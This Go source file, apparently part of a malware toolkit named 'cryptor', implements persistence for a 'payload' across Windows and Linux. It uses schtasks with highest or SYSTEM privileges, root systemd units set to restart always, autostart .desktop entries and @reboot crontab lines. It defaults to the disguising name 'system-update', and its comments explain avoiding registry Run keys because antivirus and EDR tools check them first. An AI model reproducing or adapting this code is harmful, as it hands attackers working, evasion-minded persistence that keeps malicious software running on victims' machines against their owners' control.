package cryptor

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Persistence: keep the payload alive after reboot / user logoff. Two
// OS-native mechanisms, no external dependencies.
//
//   Windows — schtasks.exe creates a scheduled task that runs the current
//   binary at logon with highest available privileges. No registry
//   Run key — those are the first thing every AV/EDR checks. schtasks
//   writes to the Task Scheduler service store instead.
//
//   Linux — writes a systemd unit (system scope, requires root) or a
//   user-level autostart .desktop (no root, runs at login). Also
//   supports an @reboot crontab entry as a fallback.
//
// Both paths are idempotent — re-running rewrites the task/unit but does
// not duplicate. Task name and unit name are set by the caller so multiple
// runs on the same host do not clobber each other.

// PersistOptions controls a persistence install.
type PersistOptions struct {
	Name       string        // task/unit name; default "system-update"
	BinaryPath string        // absolute path to the payload; defaults to os.Executable
	Args       []string      // extra arguments
	OnLogon    bool          // run at user logon (default true)
	OnBoot     bool          // run at system boot (Windows SYSTEM / Linux systemd)
	Delay      time.Duration // for user logon, delay start
	DryRun     bool
}

// PersistResult is the outcome of a persistence install.
type PersistResult struct {
	Method string // "schtasks" | "systemd" | "autostart" | "cron"
	Path   string // where the artifact was written (if applicable)
	Cmd    string // command that was run (if applicable)
	Output string
	OK     bool
	Err    string
}

// Install writes the persistence artifact. Returns the result for the OS.
func Install(opts PersistOptions) (PersistResult, error) {
	if opts.Name == "" {
		opts.Name = "system-update"
	}
	if opts.BinaryPath == "" {
		exe, err := os.Executable()
		if err != nil {
			return PersistResult{}, fmt.Errorf("cryptor/persist: cannot resolve executable: %w", err)
		}
		opts.BinaryPath = exe
	}
	if !opts.OnLogon && !opts.OnBoot {
		opts.OnLogon = true
	}

	switch runtime.GOOS {
	case "windows":
		return installWindows(opts)
	case "linux", "darwin":
		return installUnix(opts)
	default:
		return PersistResult{}, fmt.Errorf("cryptor/persist: unsupported OS %s", runtime.GOOS)
	}
}

// --- windows ---

func installWindows(opts PersistOptions) (PersistResult, error) {
	// build the command line
	runParts := []string{"\"" + opts.BinaryPath + "\""}
	for _, a := range opts.Args {
		runParts = append(runParts, a)
	}
	runCmd := strings.Join(runParts, " ")

	trigger := "onlogon"
	if opts.OnBoot {
		trigger = "onstart"
	}

	// /sc <schedule> /tn <name> /tr <command> /f /rl highest
	args := []string{
		"/create",
		"/sc", trigger,
		"/tn", opts.Name,
		"/tr", runCmd,
		"/f",
		"/rl", "HIGHEST",
	}
	if opts.Delay > 0 && trigger == "onlogon" {
		args = append(args, "/delay", fmt.Sprintf("%04d:%02d",
			int(opts.Delay.Hours()), int(opts.Delay.Minutes())%60))
	}
	if trigger == "onstart" {
		args = append(args, "/ru", "SYSTEM")
	}

	r := PersistResult{
		Method: "schtasks",
		Cmd:    "schtasks " + strings.Join(args, " "),
	}
	if opts.DryRun {
		r.OK = true
		return r, nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "schtasks", args...).CombinedOutput()
	r.Output = string(out)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

// RemoveWindows deletes the named scheduled task.
func RemoveWindows(name string) (PersistResult, error) {
	if name == "" {
		return PersistResult{}, errors.New("cryptor/persist: name required")
	}
	r := PersistResult{Method: "schtasks", Cmd: "schtasks /delete /tn " + name + " /f"}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "schtasks", "/delete", "/tn", name, "/f").CombinedOutput()
	r.Output = string(out)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

// --- unix ---

func installUnix(opts PersistOptions) (PersistResult, error) {
	// Prefer systemd if we are root; else user autostart; else crontab
	if opts.OnBoot && os.Geteuid() == 0 {
		return installSystemd(opts)
	}
	return installAutostart(opts)
}

func installSystemd(opts PersistOptions) (PersistResult, error) {
	runParts := []string{opts.BinaryPath}
	runParts = append(runParts, opts.Args...)
	execLine := strings.Join(runParts, " ")

	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
`, opts.Name, execLine)

	unitPath := "/etc/systemd/system/" + opts.Name + ".service"
	r := PersistResult{Method: "systemd", Path: unitPath}
	if opts.DryRun {
		r.OK = true
		return r, nil
	}
	if err := os.WriteFile(unitPath, []byte(unit), 0o644); err != nil {
		r.Err = err.Error()
		return r, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, "systemctl", "daemon-reload").CombinedOutput()
	r.Output = string(out)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	out2, err := exec.CommandContext(ctx, "systemctl", "enable", "--now", opts.Name+".service").CombinedOutput()
	r.Output += "\n" + string(out2)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

func installAutostart(opts PersistOptions) (PersistResult, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return PersistResult{}, fmt.Errorf("cryptor/persist: home: %w", err)
	}
	dir := filepath.Join(home, ".config", "autostart")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return PersistResult{}, fmt.Errorf("cryptor/persist: mkdir: %w", err)
	}
	entryPath := filepath.Join(dir, opts.Name+".desktop")

	runParts := []string{opts.BinaryPath}
	runParts = append(runParts, opts.Args...)
	execLine := strings.Join(runParts, " ")

	body := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=%s
Exec=%s
X-GNOME-Autostart-enabled=true
Terminal=false
`, opts.Name, execLine)

	r := PersistResult{Method: "autostart", Path: entryPath}
	if opts.DryRun {
		r.OK = true
		return r, nil
	}
	if err := os.WriteFile(entryPath, []byte(body), 0o644); err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

// installCron writes an @reboot entry into the current user's crontab. This
// overwrites the entire crontab — preexisting entries are preserved by
// appending, but the caller is responsible for knowing the environment.
func installCron(opts PersistOptions, user bool) (PersistResult, error) {
	runParts := []string{opts.BinaryPath}
	runParts = append(runParts, opts.Args...)
	execLine := strings.Join(runParts, " ")

	// read current crontab
	readArgs := []string{"-l"}
	if user {
		readArgs = []string{"-l", "-u", os.Getenv("USER")}
	}
	cur, _ := exec.Command("crontab", readArgs...).CombinedOutput()

	line := "@reboot " + execLine + " # " + opts.Name
	newBody := string(cur)
	if !strings.Contains(newBody, line) {
		if !strings.HasSuffix(newBody, "\n") && newBody != "" {
			newBody += "\n"
		}
		newBody += line + "\n"
	}

	r := PersistResult{Method: "cron"}
	if opts.DryRun {
		r.OK = true
		return r, nil
	}

	// write via `crontab -`
	writeArgs := []string{"-"}
	if user {
		writeArgs = []string{"-", "-u", os.Getenv("USER")}
	}
	cmd := exec.Command("crontab", writeArgs...)
	cmd.Stdin = strings.NewReader(newBody)
	out, err := cmd.CombinedOutput()
	r.Output = string(out)
	if err != nil {
		r.Err = err.Error()
		return r, err
	}
	r.OK = true
	return r, nil
}

// Status reports whether the current user can install systemd persistence.
func CanSystemd() bool {
	if runtime.GOOS != "linux" {
		return false
	}
	if os.Geteuid() != 0 {
		return false
	}
	if _, err := os.Stat("/etc/systemd/system"); err != nil {
		return false
	}
	return true
}
